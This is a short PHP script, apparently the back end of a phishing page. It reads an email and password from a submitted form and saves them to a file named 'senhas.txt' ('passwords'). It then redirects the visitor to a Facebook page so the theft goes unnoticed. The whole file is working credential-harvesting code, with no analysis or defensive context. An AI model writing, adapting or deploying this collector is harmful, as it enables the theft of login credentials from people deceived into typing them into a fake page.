<?php

$email = $_POST['email'];
$senha = $_POST['pass'];

$senhatxt = fopen('senhas.txt', 'w');
fwrite($senhatxt, $email . ' + ' . $senha);
fclose($senhatxt);

header('Location: https://www.facebook.com/itrocas.com.br');
?>